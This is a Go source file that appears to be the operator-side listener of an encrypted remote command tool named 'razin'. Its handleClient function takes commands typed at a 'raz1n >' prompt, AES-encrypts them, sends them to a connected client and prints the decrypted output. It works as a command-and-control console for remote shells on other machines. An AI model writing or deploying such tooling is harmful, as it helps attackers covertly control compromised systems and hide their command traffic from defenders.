package cmd

import (
	"bufio"
	"fmt"
	"net"
	"os"

	"github.com/bogdzn/razin/server/aes"
)

func handleClient(opts *CliOptions, conn net.Conn) {

	defer conn.Close()
	reader := bufio.NewReader(conn)
	stdin := bufio.NewReader(os.Stdin)

	ps1 := "raz1n"

	for {

		/* prompt for user input */
		fmt.Printf("%s > ", ps1)
		cmd, err := stdin.ReadString('\n')
		if err != nil {
			fmt.Println("Exiting...")
			break
		}

		/* encrypt message */
		encrypted := aes.EncryptAes(cmd, opts.AesKey)
		if opts.DebugEnabled {
			fmt.Printf("[+] Sending: %s\n", encrypted)
		}

		/* Send message */
		conn.Write([]byte(encrypted + "\n"))

		if opts.DebugEnabled {
			fmt.Println("[+] Sent!")
			fmt.Println("[+] Waiting for message...")
		}

		/* wait for client request */
		msg, err := reader.ReadString('\n')
		if err != nil {

			/*
			   TODO: implement error counter here

			   if more than 5 fails in a row -> yeet
			*/

			fmt.Println("[!] Error retrieving input from client")
			fmt.Printf("\t\t%s\n", err.Error())
			continue
		}

		if opts.DebugEnabled {
			fmt.Printf("[+] Received: %s\n", msg)
		}

		decrypted := aes.AesDecrypt(msg, opts.AesKey)

		/*
		   TODO:
		   support Client hello that would allow you to change ps1
		   to differentiate multiple clients
		*/
		fmt.Print(decrypted)
	}
}
